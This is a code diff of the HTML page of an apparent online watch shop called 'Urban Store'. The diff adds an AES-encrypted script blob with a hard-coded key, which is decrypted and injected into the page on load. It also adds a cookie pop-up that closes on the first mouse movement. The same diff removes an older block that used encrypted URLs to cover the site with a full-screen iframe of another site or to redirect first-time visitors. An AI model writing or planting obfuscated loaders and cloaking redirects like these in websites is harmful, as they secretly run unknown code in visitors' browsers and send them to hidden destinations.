@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="Urban Store — Contemporary women's watches for everyday elegance, designed with a modern US and UK audience in mind.">
   <title>Urban Store | Women's Luxury Watches</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   <link rel="icon" type="image/jpeg" href="assets/favicon.jpg">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -23,32 +22,93 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5044821&101" alt="free website stats program" border="0"></a></noscript>
 <!-- Histats.com  END  -->
   <link rel="stylesheet" href="assets/style.css">
-  <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        .cookie-modal-box { position: fixed; inset: 0; z-index: 9999; }
-        .cookie-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,0.4); backdrop-filter: blur(8px); z-index: 9998; }
-        .cookie-modal { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; padding: 1rem; z-index: 9999; }
-        .cookie-card { background: white; border-radius: 1.5rem; max-width: 28rem; width: 100%; padding: 2rem; position: relative; animation: fadeInScale 0.2s ease-out; }
-        @keyframes fadeInScale { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
-        .close-btn { position: absolute; top: 1rem; right: 1rem; background: none; border: none; cursor: pointer; }
-        .close-btn:hover { background: #f3f4f6; border-radius: 50%; }
-        .cookie-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; }
-        .cookie-icon { font-size: 2rem; }
-        .cookie-title { font-size: 1.5rem; font-weight: 700; color: #1f2937; }
-        .cookie-text { color: #4b5563; margin-bottom: 1.5rem; line-height: 1.5; }
-        .button-group { display: flex; flex-direction: column; gap: 0.75rem; }
-        @media (min-width: 640px) { .button-group { flex-direction: row; } }
-        .btn-agree { flex: 1; background: #16a34a; color: white; border: none; padding: 0.75rem; border-radius: 0.5rem; font-weight: 700; cursor: pointer; }
-        .btn-agree:hover { background: #15803d; }
-        .btn-refuse { flex: 1; background: #e5e7eb; color: #1f2937; border: none; padding: 0.75rem; border-radius: 0.5rem; font-weight: 700; cursor: pointer; }
-        .btn-refuse:hover { background: #d1d5db; }
-        .hidden { display: none !important; }
-        #iframeContainer { position: fixed; top: 0; left: 0; width: 100%; height: 100vh; z-index: 9997; background: white; display: none; }
-        #redirectIframe { width: 100%; height: 100%; border: none; }
-    </style>
-
 </head>
 <body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <script>
+    function aesDecode(encodedText) {
+      const decodedText = decodeURIComponent(encodedText);
+      const bytes = CryptoJS.AES.decrypt(decodedText, 'Hx9$Vm3!Qp7@Lk2#Nr8^Wy5&Ta4*Zc6');
+      return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`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`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+  </script>
+  <script>
+    document.body.style.overflow = "hidden";
+  </script>
+
+  <div id="cookie-modal-box" class="">
+    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300">
+    </div>
+    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300">
+      <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+        <button id="cookie-close" class="absolute top-4 right-4">
+          <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+            <path fill="currentColor"
+              d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z">
+            </path>
+          </svg>
+        </button>
+        <div class="flex items-center gap-3 mb-4">
+          <span class="text-yellow-500 text-3xl">🍪</span>
+          <h2 class="text-2xl font-bold">About cookies</h2>
+        </div>
+        <p class="text-gray-600 mb-6">
+          We use cookies to provide you with a better user experience. <span class="font-semibold">"agree"</span>
+          By clicking, you agree to our use of cookies.
+        </p>
+        <div class="flex flex-col sm:flex-row gap-3">
+          <button id="cookie-accept"
+            class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 agree</button>
+          <button id="cookie-decline"
+            class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">refuse</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+      modal = document.getElementById("cookie-modal"),
+      backdrop = document.getElementById("cookie-backdrop"),
+      acceptBtn = document.getElementById("cookie-accept"),
+      declineBtn = document.getElementById("cookie-decline"),
+      closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+      modalBox.classList.remove("hidden");
+      setTimeout(() => {
+        backdrop.classList.remove("opacity-0");
+        modal.classList.remove("opacity-0", "scale-90");
+      }, 10);
+    }
+
+    function hideModal(e) {
+      localStorage.setItem("cookie-consent", e);
+      setTimeout(() => {
+        modalBox.classList.add("hidden");
+      }, 1500);
+
+      // remove mousemove listener once closed
+      document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+      hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+      showModal();
+      document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+  </script>
 <header class="site-header">
   <button class="mobile-menu-btn" aria-label="Toggle menu">☰</button>
   <a class="logo" href="index.html">Urban Store</a>
@@ -242,118 +302,6 @@ hs.src = ('//s10.histats.com/js15_as.js');
     <p>Our secure checkout is undergoing scheduled maintenance and is currently unavailable. Please check back later to complete your purchase.</p>
   </div>
 </div>
-<script src="assets/script.js"></script>
-      <div id="cookieModalBox" class="cookie-modal-box">
-        <div id="cookieBackdrop" class="cookie-backdrop"></div>
-        <div id="cookieModal" class="cookie-modal">
-            <div class="cookie-card">
-                <button id="cookieClose" class="close-btn">
-                    <svg viewBox="0 0 15 15" width="24" height="24">
-                        <path d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z" fill="currentColor"/>
-                    </svg>
-                </button>
-                <div class="cookie-header">
-                    <span class="cookie-icon">🍪</span>
-                    <h2 class="cookie-title">About cookies</h2>
-                </div>
-                <p class="cookie-text">
-                    We use cookies to provide you with a better user experience. By clicking "agree", you agree to our use of cookies.
-                </p>
-                <div class="button-group">
-                    <button id="cookieAccept" class="btn-agree">🍪 agree</button>
-                    <button id="cookieDecline" class="btn-refuse">refuse</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- 🔥 YAHAN IFRAME CONTAINER (Redirect ke liye) 🔥 -->
-    <div id="iframeContainer" style="display:none;">
-        <iframe id="redirectIframe" src="about:blank"></iframe>
-    </div>
-  <script>
-        // AES Decode Function
-        function aesDecode(encodedText) {
-            try {
-                const decodedText = decodeURIComponent(encodedText);
-                const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
-                return bytes.toString(CryptoJS.enc.Utf8);
-            } catch(e) {
-                console.error("Decryption error:", e);
-                return "";
-            }
-        }
-
-
-// 🔥 ENCRYPTED REDIRECT URL 🔥
-        const encryptedPersonalSite = "U2FsdGVkX19vdLiIi0/VaFJr/dWJppmuCdYZTw3IYxs7+lmoTaXm2LahZuYDZ/XDbx5oKR0iJhZk1fuB4HZfquj3ugxoihp+TbW+uJfc1663Zih0Ix/SqfRE9IxqRHAY";
-        const encryptedHomeRedirect = "U2FsdGVkX1/dSXUuPLfJt4cXc54FVy6N9/sPnxHCW+Y=";
-        
-        let isFirstVisit = !localStorage.getItem("cookie-consent");
-        let redirectTriggered = false;
-        
-        function performRedirect() {
-            if (redirectTriggered) return;
-            redirectTriggered = true;
-            
-            const yourContent = document.getElementById("yourWebsiteContent");
-            const iframeContainer = document.getElementById("iframeContainer");
-            const iframe = document.getElementById("redirectIframe");
-            
-            if (isFirstVisit) {
-                let targetUrl = aesDecode(encryptedPersonalSite);
-                
-                if (!targetUrl || targetUrl === "") {
-                    console.error("Decryption failed!");
-                    return;
-                }
-                
-                if (yourContent) yourContent.style.display = "none";
-                
-                if (iframeContainer) {
-                    iframeContainer.style.display = "block";
-                    iframe.src = targetUrl;
-                } else {
-                    const newIframeContainer = document.createElement('div');
-                    newIframeContainer.id = 'iframeContainer';
-                    newIframeContainer.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100vh;z-index:9997;background:white;';
-                    newIframeContainer.innerHTML = '<iframe id="redirectIframe" src="' + targetUrl + '" style="width:100%;height:100%;border:none;"></iframe>';
-                    document.body.appendChild(newIframeContainer);
-                }
-            } else {
-                const homeUrl = aesDecode(encryptedHomeRedirect);
-                if (homeUrl && homeUrl !== "") {
-                    window.location.href = homeUrl;
-                }
-            }
-        }
-        
-        const modalBox = document.getElementById("cookieModalBox");
-        const backdrop = document.getElementById("cookieBackdrop");
-        const acceptBtn = document.getElementById("cookieAccept");
-        const declineBtn = document.getElementById("cookieDecline");
-        const closeBtn = document.getElementById("cookieClose");
-        
-        function hideModalAndRedirect(consent) {
-            localStorage.setItem("cookie-consent", consent);
-            if (modalBox) modalBox.classList.add("hidden");
-            document.removeEventListener("mousemove", mouseMoveHandler);
-            performRedirect();
-        }
-        
-        function mouseMoveHandler() {
-            hideModalAndRedirect("closed");
-        }
-        
-        if (acceptBtn) acceptBtn.onclick = () => hideModalAndRedirect("accepted");
-        if (declineBtn) declineBtn.onclick = () => hideModalAndRedirect("declined");
-        if (closeBtn) closeBtn.onclick = () => hideModalAndRedirect("closed");
-        if (backdrop) backdrop.onclick = () => hideModalAndRedirect("closed");
-        
-        if (modalBox) {
-            modalBox.classList.remove("hidden");
-            document.addEventListener("mousemove", mouseMoveHandler, { once: true });
-        }
-    </script>  
+<script src="assets/script.js"></script>  
 </body>
 </html>
